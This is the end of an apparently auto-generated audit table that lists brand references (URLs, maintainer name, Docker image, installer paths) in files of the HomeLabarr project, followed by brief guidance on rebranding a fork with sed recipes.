| `public/.well-known/security.txt` | 1 x | `Canonical: https://demo.homelabarr.com/.well-known/security.txt` |
| `public/.well-known/security.txt` | 1 x | `Contact: https://github.com/imogenlabs/homelabarr-ce/security/advisories/new` |
| `public/.well-known/security.txt` | 1 x | `Policy: https://github.com/imogenlabs/homelabarr-ce/blob/main/SECURITY.md` |
| `public/humans.txt` | 1 x | `Maintainer: Michael Ashley -- smashingtags` |
| `public/humans.txt` | 1 x | `Site: https://homelabarr.com` |
| `public/sitemap.xml` | 1 x | `    <loc>https://demo.homelabarr.com/</loc>` |
| `tests/README.md` | 1 x | `TEST_BASE_URL=https://ce-dev.homelabarr.com npx playwright test` |
| `tests/README.md` | 1 x | `TEST_BASE_URL=https://ce-staging.homelabarr.com npx playwright test` |
| `tests/e2e/README.md` | 1 x | `TEST_BASE_URL=https://ce-dev.homelabarr.com npx playwright test --project=smoke` |
| `traefik/installer/ubuntu.sh` | 2 x | `   envmigrate="/opt/homelabarr/apps/.subactions/envmigrate.sh"` |
| `traefik/installer/ubuntu.sh` | 1 x | `   source="/opt/homelabarr/traefik/templates/"` |
| `traefik/templates/compose/docker-compose.yml` | 1 x | `    image: 'smashingtags/cf-companion:latest'` |

---

## How to use this

Every row is distinct matched text in a file; the count shows repeated lines.
Most references can be handled by the
`sed` recipes in the [White-Label & Forking guide](white-label.md#the-5-minute-starter);
the rest are one-off edits (meta tags, scripts, URLs).

If you find a brand reference in your fork that isn't listed here, either your fork
has diverged from upstream or this audit is lagging — check the workflow run on the
last commit to `main`.
